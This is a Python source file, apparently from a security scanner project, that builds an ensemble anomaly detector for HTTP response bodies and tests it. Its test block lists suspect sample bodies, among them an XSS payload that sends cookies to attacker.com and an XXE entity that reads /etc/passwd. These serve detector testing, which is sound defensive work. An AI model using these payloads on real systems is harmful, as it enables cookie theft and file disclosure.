#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Thu Mar 26 08:08:09 2026

@author: hounsousamuel
"""

#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Mar 23 11:05:13 2026

@author: hounsousamuel
"""

import os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(os.path.join(__file__, ".."))))

import json
import numpy as np
import optuna
import traceback
from optuna.importance import get_param_importances
from optuna.visualization.matplotlib import (
    plot_optimization_history, plot_param_importances, 
    plot_parallel_coordinate, plot_terminator_improvement
)
from matplotlib import pyplot as plt
from sklearn.model_selection import train_test_split
from sklearn.preprocessing import RobustScaler
from sklearn.pipeline import Pipeline
from sklearn.ensemble import StackingClassifier
from sklearn.ensemble import IsolationForest
from sklearn.svm import OneClassSVM
from sklearn.neighbors import LocalOutlierFactor
import skops.io as skio
import zstandard as zstd
from zipfile import ZIP_DEFLATED

_JOBS = int(0.75 * os.cpu_count())
_RANDOM_STATE = 42
_PLOT_FUNC = [
    plot_optimization_history, plot_param_importances, 
    plot_parallel_coordinate, plot_terminator_improvement
]
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
os.makedirs(BASE_DIR, exist_ok=True)

class AnomalyModelSklearn:
    def __init__(
        self,
        model_dir = "anomalie_models",
        weights:tuple = (0.4, 0.35, 0.25),  # IF, LOF, SVM
        verbose:int = 1,
    ):
        self.if_model:IsolationForest|None  = None
        self.lof_model:LocalOutlierFactor|None = None
        self.svm_model:OneClassSVM|None = None
        self.weights   = np.array(weights)
        self.weights = self.weights / self.weights.sum()

        self._if_stats = None  # (mean, std)
        self._lof_stats = None
        self._svm_stats = None
        self.model_dir = os.path.join(BASE_DIR, model_dir)
        self.verbose = verbose
    
    def _get_params_trial(self, name: str, trial: optuna.Trial) -> dict:
        name = name.lower()
    
        _PARAMS_DEF = {
            "if": {
                "n_estimators": ("int", 100, 500),
                "max_features": ("float", 0.5, 1.0),
                "contamination": ("float", 0.01, 0.15),
                "bootstrap": ("categorical", [True, False]),
            },
            "lof": {
                "n_neighbors": ("int", 5, 50),
                "contamination": ("float", 0.01, 0.15),
                "leaf_size": ("int", 10, 50),
                "metric": ("categorical", ["euclidean", "manhattan", "cosine", "minkowski"]),
            },
            "svm": {
                "nu": ("float", 0.01, 0.2),
                "tol": ("float", 1e-5, 1e-2),
                "gamma": ("logfloat", 1e-4, 1e-1),
                "kernel": ("categorical", ["rbf", "sigmoid"]),
            },
        }
    
        params_def = _PARAMS_DEF[name]
        params = {}
    
        for param_name, param_config in params_def.items():
            param_type = param_config[0]
    
            if param_type == "int":
                params[param_name] = trial.suggest_int(
                    param_name, param_config[1], param_config[2]
                )
            elif param_type == "float":
                params[param_name] = trial.suggest_float(
                    param_name, param_config[1], param_config[2]
                )
            elif param_type == "logfloat":
                params[param_name] = trial.suggest_float(
                    param_name, param_config[1], param_config[2], log=True
                )
            elif param_type == "categorical":
                params[param_name] = trial.suggest_categorical(
                    param_name, param_config[1]
                )
    
        print(f"Paramètres Optuna générés pour {name} : {list(params.keys())}")
        return params
    
    def _get_params_dict(self, name: str, *args, **kwargs) -> dict:
        name = name.lower()
    
        _PARAMS = {
            "if": {
                "n_estimators":  300,
                "max_features":  0.3,
                "contamination": 0.05,
                "bootstrap":     True,
            },
            "lof": {
                "n_neighbors": 20,
                "contamination": 0.05,
                "leaf_size": 30,
                "metric": "euclidean",
            },
            "svm": {
                "nu": 0.05,
                "gamma":  "scale",
                "kernel": "rbf",
            },
        }
    
        params = _PARAMS[name]
        print(f"Paramètres fixes générés pour {name}")
        return params
        
    def _objective_eval(self, X, model):
        X, X_test = train_test_split(X, test_size=0.2)
        X = np.asarray(X)
        model.fit(X)
        try:
            score_samples = model.score_samples(X_test)
        except Exception as e:
            print("Erreur dans _objective_eval, modèle ne supporte pas score_samples : ", str(e))
            score_samples = model.decision_function(X_test)
        
        score_samples = np.asarray(score_samples)
        std = score_samples.std()
        # gap = np.percentile(score_samples, 90) - np.percentile(score_samples, 50)
        return std # gap / (std + 1e-8)
        
    def optimize(
            self, X:np.ndarray,
            model, name:str,
            n_trials:int = 50,
            timeout:float = 60,
            visualize:bool = True
        ):
        
        def objective(trial):
            params = self._get_params_trial(name, trial)
            model.set_params(**params)
            return self._objective_eval(X, model)
        
        study = optuna.create_study(direction="minimize", study_name=type(model).__name__ + " optimization")
        study.optimize(
            func=objective,
            n_trials=n_trials, timeout=timeout
            )
        print("=" * 10 + f" PARAMS IMPORTANCE  DE {type(model).__name__}" + "=" * 10)
        param_importances = get_param_importances(study)
        for param, importance in list(param_importances.items())[:10]:
            print(f"  {param}: {importance:.3f}")
        print("=" * 30)

        if visualize:
            base_dir = os.path.join(BASE_DIR, "results_optuna")
            os.makedirs(base_dir, exist_ok=True)
            for plot_func in _PLOT_FUNC:
                try:
                  plot_func(study).plot()
                  plt.tight_layout()
                  
                  plot_name = plot_func.__name__.replace('plot_', '')
                  plot_path = os.path.join(base_dir, f"{plot_name}.png")
                  plt.savefig(plot_path)
                  
                  plt.show(block=False)
                  print(f"✅ Graphique {plot_func.__name__} sauvegardé dans {plot_path}")
                  
                except Exception as e:
                    print(f"Erreur lors de la génération du graphique {plot_func.__name__}: {e}")

        print(f"✅ Optimisation terminée - Meilleur score: {study.best_value:.4f}")
        return study.best_params
    
    def _get_base_models(self) -> dict:
        return {
            "if": IsolationForest(n_jobs=_JOBS, random_state=_RANDOM_STATE, verbose=self.verbose),
            "lof": LocalOutlierFactor(novelty=True, n_jobs=_JOBS,),
            "svm": OneClassSVM(max_iter=-1, verbose=bool(self.verbose))
            }
    
    def create_models(
            self, X:np.ndarray,
            optimize:bool = True,
            n_trials:int = 50,
            timeout:float = 60,
            visualize:bool = True
        ):
        models = self._get_base_models()
        if optimize:
            for k, v in list(models.items()):
                best_params = self.optimize(
                    X, v, name=k,
                    n_trials=n_trials,
                    timeout=timeout,
                    visualize=visualize
                )
                models[k] = models[k].set_params(**best_params)
        else:
            for k, v in list(models.items()):
                models[k] = models[k].set_params(**self._get_params_dict(k))
                
        self.if_model = models["if"]
        self.lof_model = models["lof"]
        self.svm_model = models["svm"]
        return models         
    
    def fit(
        self, X:np.ndarray,
        optimize:bool = True,
        n_trials:int = 50,
        timeout:float = 60,
        visualize:bool = True,
        optimization_size:float = 0.8,
    ):
        if optimize:
            X_opt, _ = train_test_split(
                X, test_size=optimization_size, random_state=_RANDOM_STATE
            )
            self.create_models(
                X=X_opt,
                optimize=True,
                n_trials=n_trials,
                timeout=timeout,
                visualize=visualize
                )
        else:
            self.create_models(X, optimize=False)
        
        print("  Fit IF...")
        self.if_model.fit(X)

        print("  Fit LOF...")
        self.lof_model.fit(X)

        print("  Fit OneClassSVM...")
        self.svm_model.fit(X)
        
        if_s  = self.if_model.score_samples(X)
        lof_s = self.lof_model.score_samples(X)
        svm_s = self.svm_model.score_samples(X)

        self._if_stats  = (if_s.mean(),  if_s.std()  + 1e-8)
        self._lof_stats = (lof_s.mean(), lof_s.std() + 1e-8)
        self._svm_stats = (svm_s.mean(), svm_s.std() + 1e-8)

        print("  ✅ Models fitted")
        model = {
            "if_model": self.if_model,
            "lof_model": self.lof_model,
            "svm_model": self.svm_model,
            "_if_stats": self._if_stats,
            "_lof_stats": self._lof_stats,
            "_svm_stats": self._svm_stats,
            }
        self.save_model(model, self.model_dir)
        return self
        
    def save_model(self, model, dir:str):
        print(f"💾 Sauvegarde du modèle dans {dir}")
        
        try:
            print("Sérialisation avec skops.io.dumps...")
            dumps = skio.dumps(model, compresslevel=8, compression=ZIP_DEFLATED)
            skops_size = len(dumps) / (1024 * 1024)
            print(f"✓ Taille après Skops: {skops_size:.2f} MB")
            
            os.makedirs(dir, exist_ok=True)
            
            print("Compression avec Zstandard (niveau 20)...")
            compressed = zstd.compress(dumps, level=20)
            
            model_path = os.path.join(dir, "model.skops.zst")
            with open(model_path, 'wb') as f:
                f.write(compressed)
            
            final_size = os.path.getsize(model_path) / (1024 * 1024)
            ratio = len(dumps) / len(compressed)
            
            print(f"✓ Modèle sauvegardé: {model_path}")
            print(f"   └─ Taille finale: {final_size:.2f} MB (ratio: {ratio:.2f}x)")
            
            metadata = {
                "compression": {
                    "skops_level": 8,
                    "zstd_level": 20,
                    "original_size_mb": skops_size,
                    "final_size_mb": final_size,
                    "ratio": ratio
                }
            }
            
            meta_path = os.path.join(dir, "metadata.json")
            with open(meta_path, "w") as f:
                json.dump(metadata, f, indent=2)
            
            meta_size = os.path.getsize(meta_path) / 1024
            print(f"✓ Métadonnées sauvegardées: {meta_path} ({meta_size:.2f} KB)")
            
        except Exception as e:
            print(f"❌ Erreur de sauvegarde du modèle: {str(e)}")
            print(traceback.format_exc())
            raise
    
    def load_model(self, dir:str):
        print(f"📂 Chargement du modèle depuis {dir}")
        
        try:
            model_path = os.path.join(dir, "model.skops.zst")
            meta_path = os.path.join(dir, "metadata.json")
            
            missing = []
            if not os.path.exists(model_path):
                missing.append("model.skops.zst")
            if not os.path.exists(meta_path):
                missing.append("metadata.json")
                
            if missing:
                raise FileNotFoundError(f"Fichiers manquants: {', '.join(missing)}")
            
            print("Lecture du fichier compressé...")
            with open(model_path, "rb") as f:
                compressed = f.read()
            
            print("Décompression Zstandard...")
            decompressed = zstd.decompress(compressed)
            
            print("Désérialisation Skops...")
            model = skio.loads(decompressed, trusted=[
                'numpy.dtype', 
                'sklearn._loss.link.Interval',
                'sklearn._loss.link.LogitLink',
                'sklearn._loss.loss.HalfBinomialLoss', 
                'sklearn.ensemble._hist_gradient_boosting.binning._BinMapper',
                'sklearn.ensemble._hist_gradient_boosting.predictor.TreePredictor', 
                'sklearn.impute._iterative._ImputerTriplet',
                'sklearn.multiclass._ConstantPredictor', 
                'sklearn.neural_network._stochastic_optimizers.AdamOptimizer', 
                'sklearn.utils._bunch.Bunch', 'xgboost.core.Booster', 
                'xgboost.sklearn.XGBClassifier',
                'sklearn.metrics._dist_metrics.EuclideanDistance64', 
                'sklearn.neighbors._kd_tree.KDTree'
            ])
            for k, v in model.items():
                setattr(self, k, v)
                
            print("Chargement des métadonnées...")
            with open(meta_path, "r") as f:
                metadata = json.load(f)
            
            # self._lof_stats = metadata["_lof_stats"]
            # self._if_stats = metadata["_if_stats"]
            # self._svm_stats = metadata["_svm_stats"]
            
            if "compression" in metadata:
                comp = metadata["compression"]
                print(f"   └─ Compression: ratio {comp['ratio']:.2f}x ({comp['original_size_mb']:.1f} MB → {comp['final_size_mb']:.1f} MB)")
            
            print("✅ Modèle chargé avec succès")
            
        except Exception as e:
            print(f"❌ Erreur de chargement du modèle: {str(e)}")
            print(traceback.format_exc())
            raise
    
    def normalize(self, X, stats:tuple) -> np.ndarray|float:
        mean, std = stats
        std = max(std, 0.01) 
        result = -(np.asarray(X) - mean) / std
        return np.clip(result, -10, 10)
    
    def score(self, X) -> np.ndarray:
        """
        Retourne un score d'anomalie par sample.
        Plus le score est HAUT, plus c'est anormal.
        """
        if isinstance(X, np.ndarray) and X.ndim == 1:
            X = X.reshape(1, -1)
        if_s  = self.if_model.score_samples(X)
        lof_s = self.lof_model.score_samples(X)
        svm_s = self.svm_model.score_samples(X)

        if_n  = self.normalize(if_s, self._if_stats)
        lof_n = self.normalize(lof_s, self._lof_stats)
        svm_n = self.normalize(svm_s, self._svm_stats)

        final = (self.weights[0] * if_n +
                 self.weights[1] * lof_n +
                 self.weights[2] * svm_n)
        return final

    def score_detail(self, x) -> dict:
        """Détail des scores individuels — utile pour debug."""
        if isinstance(x, np.ndarray) and x.ndim == 1:
            x = x.reshape(1, -1)
        # decision_function, score_samples
        if_s  = self.if_model.score_samples(x)
        lof_s = self.lof_model.score_samples(x)
        svm_s = self.svm_model.score_samples(x)

        return {
            "if_raw":    if_s,
            "lof_raw":   lof_s,
            "svm_raw":   svm_s,
            "if_norm":   self.normalize(if_s,  self._if_stats),
            "lof_norm":  self.normalize(lof_s, self._lof_stats),
            "svm_norm":  self.normalize(svm_s, self._svm_stats),
            "final":     self.score(x),
        }

if __name__ == "__main__":
    import joblib
    import numpy as np
    from fuzzer.similarity import CosineSimilarityTFIDF

    print("""
╔══════════════════════════════════════════════════════════╗
║   ShieldAI — Test AnomalyModelSklearn                   ║
╚══════════════════════════════════════════════════════════╝
""")

    # ── 1. Charger les bodies ─────────────────────────────────────
    BODIES_PATH   = "/home/hounsousamuel/PROJET/ShieldIA_v2/scanner_ia/fuzzer/bodies/bodies_deduplicate.pkl"
    COSINE_DIR    = "/home/hounsousamuel/PROJET/ShieldIA_v2/scanner_ia/fuzzer/model_similarity/"
    MODEL_DIR     = "test_anomalie_models"
    N_FEATURES    = 5000

    print("📂 Chargement des bodies...")
    bodies_all = joblib.load(BODIES_PATH)[:]
    print(f"   Total : {len(bodies_all)} bodies")

    # Filtrer CSIC — garder uniquement les réponses HTML/JSON
    HTTP_METHODS  = ('GET ', 'POST ', 'PUT ', 'DELETE ', 'HEAD ', 'OPTIONS ')
    bodies_normal = [
        b for b in bodies_all
        if not b.strip().startswith(HTTP_METHODS)
    ]
    html_count = sum(1 for b in bodies_normal if b.strip().startswith('<'))
    json_count = sum(1 for b in bodies_normal if b.strip().startswith('{') or b.strip().startswith('['))
    xml_count  = sum(1 for b in bodies_normal if b.strip().startswith('<?xml'))
    other      = len(bodies_normal) - html_count - json_count - xml_count
    
    print(f"HTML  : {html_count} ({100*html_count/len(bodies_normal):.1f}%)")
    print(f"JSON  : {json_count} ({100*json_count/len(bodies_normal):.1f}%)")
    print(f"XML   : {xml_count}  ({100*xml_count/len(bodies_normal):.1f}%)")
    print(f"Autre : {other}      ({100*other/len(bodies_normal):.1f}%)")
    print(f"   Après filtrage CSIC : {len(bodies_normal)} bodies de réponses")

    # ── 2. Charger TF-IDF et transformer ─────────────────────────
    print("\n🧠 Chargement TF-IDF...")
    tfidf = CosineSimilarityTFIDF(model_dir=COSINE_DIR, n_features=N_FEATURES)
    tfidf.load_model(COSINE_DIR)

    print("   Transformation TF-IDF → sparse matrix...")
    X_sparse = tfidf.model.transform(bodies_normal)
    X_dense  = X_sparse.toarray().astype(np.float32)
    print(f"   Shape : {X_dense.shape}")

    # ── 3. Bodies suspects pour évaluation ───────────────────────
    SUSPECT_BODIES = [
        ("root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:",              "CMDi — /etc/passwd"    ),
        ("uid=0(root) gid=0(root) groups=0(root) SHLD1234",             "CMDi — whoami"         ),
        ("SQL syntax error near SELECT * FROM users WHERE id=",          "SQLi — erreur MySQL"   ),
        ("DB_PASSWORD=Sup3rS3cr3t API_KEY=sk-live-abc123",              "CredsExpose — .env"    ),
        ("<script>fetch('https://attacker.com?c='+document.cookie)</script>", "XSS"             ),
        ("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEA",   "DirTrav — clé SSH"    ),
        ("ami-id: ami-0123456789\nlocal-ipv4: 169.254.169.254",          "SSRF — AWS metadata"  ),
        ("<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "XXE"),
    ]

    X_suspect = tfidf.model.transform(
        [b for b, _ in SUSPECT_BODIES]
    ).toarray().astype(np.float32)

    # ── 4. Instancier et fitter ───────────────────────────────────
    print("\n🔧 Instanciation AnomalyModelSklearn...")
    model = AnomalyModelSklearn(
        model_dir=MODEL_DIR,
        weights=(0.4, 0.35, 0.25),
        verbose=1
    )

    # ── TEST A — Sans optimisation (params fixes) ─────────────────
    print("\n" + "─" * 55)
    print("TEST A — Fit sans optimisation (params fixes)")
    print("─" * 55)
    model.fit(
        X_dense,
        optimize=False,
    )

    # Évaluation
    def evaluate(model, X_normal_sample, X_suspect, suspect_labels):
        print(f"\n  Bodies NORMAUX (score doit être BAS) :")
        normal_scores = model.score(X_normal_sample[:10])
        for i, s in enumerate(normal_scores):
            print(f"  score={s:.4f}  ← Normal[{i}]")
        print(f"  → moy={normal_scores.mean():.4f} | std={normal_scores.std():.4f}")

        print(f"\n  Bodies SUSPECTS (score doit être HAUT) :")
        suspect_scores = model.score(X_suspect)
        for score, (_, label) in zip(suspect_scores, suspect_labels):
            ratio = score / max(normal_scores.mean(), 1e-8)
            flag  = "🔴 ANOMALIE" if ratio > 2.0 else "🟡 limite" if ratio > 1.2 else "🟢 normal"
            print(f"  {flag} score={score:.4f} (x{ratio:.1f}) ← {label}")

        gap = np.percentile(suspect_scores, 90) - np.percentile(normal_scores, 50)
        std = normal_scores.std() + 1e-8
        print(f"\n  📊 gap={gap:.4f} | std={std:.4f} | gap/std={gap/std:.2f}")

    evaluate(model, X_dense, X_suspect, SUSPECT_BODIES)

    # ── TEST B — Avec optimisation Optuna ─────────────────────────
    print("\n" + "─" * 55)
    print("TEST B — Fit avec optimisation Optuna (50 trials, 60s)")
    print("─" * 55)
    model_opt = AnomalyModelSklearn(
        model_dir=MODEL_DIR + "_opt",
        weights=(0.4, 0.35, 0.25),
        verbose=0
    )
    model_opt.fit(
        X_dense,
        optimize=True,
        n_trials=10,
        timeout=600,
        visualize=True,
        optimization_size=0.95,  # 20% des données pour Optuna → rapide
    )
    evaluate(model_opt, X_dense, X_suspect, SUSPECT_BODIES)

    # ── TEST C — Chargement depuis disque ────────────────────────
    print("\n" + "─" * 55)
    print("TEST C — Chargement depuis disque + score_detail")
    print("─" * 55)
    model_loaded = AnomalyModelSklearn(model_dir=MODEL_DIR)
    model_loaded.load_model(MODEL_DIR)

    print("\n  Score détaillé sur un suspect :")
    vec = X_suspect[0:1]
    detail = model_loaded.score_detail(vec)
    for k, v in detail.items():
        print(f"  {k:<12} : {np.asarray(v).flat[0]:.6f}")

    print("\n✅ Tous les tests terminés")
        